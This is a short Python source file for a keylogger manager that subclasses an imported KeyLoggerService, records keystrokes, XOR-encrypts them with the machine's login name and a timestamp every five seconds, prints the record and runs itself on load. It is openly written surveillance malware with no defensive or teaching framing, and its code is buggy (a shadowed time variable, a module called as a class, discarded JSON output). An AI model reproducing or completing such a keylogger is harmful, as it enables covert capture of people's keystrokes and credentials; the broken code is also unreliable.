from KeyLoggerService import KeyLoggerService
from   Encryptor  import Encryptor


class KeyLoggerManager(KeyLoggerService):
    def __init__(self):
        super().__init__()

    def start(self):
            from datetime import datetime
            import time, os, json, Encryptor
            machine = os.getlogin()
            self.start_logging()
            self.encryption = Encryptor()
            while True:
                    import time
                    time.sleep(5)
                    time = str(datetime.now())
                    jeson = {'time':time,'data':self.encryption.encryption_using_xor(str(self.text),4),'machine':machine}
                    json.dumps(jeson,ensure_ascii=False)
                    print(jeson)
                    self.text.clear()

C = KeyLoggerManager()
C.start()                    